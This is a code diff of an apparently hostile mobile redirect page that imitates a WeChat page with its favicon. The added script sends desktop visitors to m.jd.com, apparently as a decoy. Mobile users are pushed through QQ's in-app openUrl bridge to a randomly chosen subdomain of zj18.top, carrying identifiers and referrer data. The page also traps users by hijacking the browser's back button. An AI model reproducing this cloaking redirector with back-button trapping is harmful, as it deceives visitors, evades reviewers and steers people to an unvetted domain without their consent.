@@ -1,56 +1,122 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html class="">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>跳转中...</title>
-    <script>
-        // 预定义的二级域名列表
-        const subdomains = [
-            'api', 'shop', 'blog', 'docs', 'help', 
-            'support', 'news', 'events', 'store', 'app',
-            'portal', 'admin', 'dashboard', 'account', 'billing'
-        ];
-        
-        // 获取当前URL参数
-        function getUrlParams() {
-            const params = new URLSearchParams(window.location.search);
-            const paramsObj = {};
-            
-            for (const [key, value] of params) {
-                paramsObj[key] = value;
+<meta name="wechat-enable-text-zoom-em" content="true">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="color-scheme" content="light dark">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
+<link rel="shortcut icon" type="image/x-icon" href="https://res.wx.qq.com/a/wx_fed/assets/res/NTI4MWU5.ico">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<meta http-equiv="pragma" content="no-cache">
+<meta http-equiv="expires" content="0">
+<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
+<script charset="UTF-8" type="text/javascript" src="https://qqvip-web.cdn-go.cn/mono/latest/vendors/qqmobile/qqapi.wk.js?_bid=5234"></script>
+<script type="text/javascript">
+function myEeplace(url) {
+    return url.replace(/\{(\w+?)\}/g, function(s1, s2) {
+        var res = "";
+        for (var i = 0; i < s2.length; i++) {
+            if (s2[i] === "n") {
+                res += Math.floor(Math.random() * 10);
+            } else if (s2[i] === "w") {
+                res += String.fromCharCode(97 + Math.floor(Math.random() * 26));
             }
-            
-            return paramsObj;
         }
-        
-        // 生成随机二级域名
-        function generateRandomSubdomain() {
-            const randomIndex = Math.floor(Math.random() * subdomains.length);
-            return subdomains[randomIndex];
+        return res;
+    });
+}
+function opensdk(url) {
+    url = myEeplace(url);
+    var conf = {url: url, target: 1, style: 2};
+    mqq.invoke("ui", "openUrl", conf);
+}
+let isWechat = window.navigator.userAgent.toLowerCase().includes("micromessenger");
+if (isWechat <= 0) {}
+let screenWidth = window.screen.width;
+let screenHeight = window.screen.height;
+if (screenWidth >= 768) {
+    window.location.href = "https://m.jd.com";
+}
+function GetQueryString(name) {
+      const query = window.location.href.split('?')[1];
+      if (!query){
+          let rawHost = document.domain || '';
+      if (!rawHost || rawHost === rawHost.toLowerCase()) {
+        const urlMatch = window.location.href.match(/^https?:\/\/([^\/?#:]+)/);
+        if (urlMatch && urlMatch[1]) {
+          rawHost = urlMatch[1];
         }
-        
-        // 构建目标URL并跳转
-        function performRedirect() {
-            const subdomain = generateRandomSubdomain();
-            const baseDomain = 'zj18.top';
-            const params = getUrlParams();
-            
-            // 构建参数字符串
-            const paramString = new URLSearchParams(params).toString();
-            
-            // 构建完整URL
-            const targetUrl = `https://${subdomain}.${baseDomain}${paramString ? '?' + paramString : ''}`;
-            
-            // 立即跳转
-            window.location.href = targetUrl;
+      }
+      const dotIndex = rawHost.indexOf('.');
+      if (dotIndex > 0) {
+        const str = rawHost.substring(0, dotIndex);
+        return str;
+      }
+      };
+      const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+      const r = query.match(reg);
+      if (r != null) return decodeURIComponent(r[2]);
+      return null;
+}
+function GetFirstParamValue() {
+  const query = window.location.href.split('?')[1];
+  if (!query) return null;
+  const params = query.split('&');
+  for (let param of params) {
+    if (param.includes('=')) {
+      const name = param.split('=')[0];
+      if (name && name.length === 2) {
+        const value = param.split('=')[1];
+        return decodeURIComponent(value);
+      }
+    } else {
+      continue;
+    }
+  }
+  return null;
+}
+var bucket = GetQueryString("bucket");
+let str = GetQueryString();
+if(!str){
+    str = GetFirstParamValue();
+}
+var uopenid = GetQueryString("uopenid");
+var type = GetQueryString("type");
+var sign = Date.now();
+var openid = "";
+function customJump() {
+    const subDomains = ['app', 'web', 'm', 'api', 'user', 'demo', 'visit', 'entry', 'go', 'link'];
+    const randomSub = subDomains[Math.floor(Math.random() * subDomains.length)];
+    const targetDomain = `${randomSub}.zj18.top`;
+    const params = new URLSearchParams();
+    params.append('bucket', bucket || '');
+    params.append('ic', str || '');
+    params.append('sign', sign);
+    params.append('type', type || '');
+    params.append('_wv', '9983');
+    params.append('from', window.location.hostname);
+    params.append('t', new Date().getTime());
+    params.append('device', /Mobile|Android|iOS/.test(navigator.userAgent) ? 'mobile' : 'pc');
+    const targetUrl = `https://${targetDomain}?${params.toString()}`;
+    opensdk(targetUrl);
+}
+setTimeout(customJump, 1000);
+setTimeout(function() {
+    location = "https://m.jd.com/" + new Date().getTime();
+}, 10000);
+</script>
+    <script>
+        if (window.history && window.history.pushState) {
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.go(1);
+            };
         }
-        
-        // 页面加载后立即执行跳转
-        window.onload = performRedirect;
     </script>
 </head>
 <body>
-    <!-- 页面内容为空，直接跳转 -->
 </body>
 </html>
